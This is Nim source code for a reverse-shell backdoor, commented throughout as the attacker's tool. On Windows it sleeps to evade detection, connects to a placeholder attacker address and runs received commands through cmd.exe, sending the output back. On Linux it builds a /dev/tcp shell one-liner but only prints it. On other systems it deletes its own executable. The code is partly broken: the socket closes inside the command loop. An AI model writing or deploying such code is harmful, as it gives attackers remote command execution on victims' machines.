import std/net, osproc, os, strformat

proc windows() =
  # Sleep for 20,000 milliseconds (20 seconds) to potentially evade detection
  sleep(20000)

  # Define the attacker's IP address and port number
  let
    ip = "attacker ip"  # Replace with the actual IP address of the attacker
    port = 1234         # Replace with the actual port number the attacker is listening on

  # Create a new socket
  let socket = newSocket()

  # Connect the socket to the attacker's IP address and port
  try:
    socket.connect(ip, Port(port))
  except:
    quit("Failed to connect to the attacker's server")

  # Define the shell prompt to be displayed
  let prompt = "shell>"

  # Enter an infinite loop to continually receive and execute commands from the attacker
  while true:
    try:
      # Send the shell prompt to the attacker
      send(socket, prompt)

      # Receive a command from the attacker
      let bad = recvLine(socket)

      # Execute the received command using cmd.exe (on Windows) and capture the output
      let cmd = execProcess(fmt"cmd.exe /c {bad}", bad)

      # Send the output of the executed command back to the attacker
      send(socket, cmd)
    except OSError:
      # If an error occurs, send an error message back to the attacker
      send(socket, "An error occurred while processing the command")
    finally:
      try:
        # Close the socket
        socket.close()
      except OSError:
        quit("Failed to close the socket")

proc linux() = 
  let 
    ip = "Attacker ip"
    port = 1234

  let payload = fmt"sh -i >& /dev/tcp/{ip}/{port} 0>&1"
  echo payload

proc main() = 
  if system.hostOs == "windows":
    windows()
  if system.hostOs == "linux":
    linux()
  else:
    let execpath = getAppFilename()
    removeFile(execpath)
    quit("Unsupported operating system")

main()
